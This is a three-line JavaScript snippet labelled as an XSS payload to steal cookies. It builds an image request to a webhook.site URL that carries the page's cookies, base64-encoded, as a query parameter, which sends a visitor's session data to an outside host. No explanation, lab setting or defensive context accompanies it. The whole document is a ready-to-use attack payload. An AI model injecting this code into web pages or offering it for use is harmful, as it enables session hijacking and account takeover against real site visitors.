// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/9012c8d6-aa1d-4b39-9d0a-491f60c3dc2f?data=' + btoa(document.cookie);
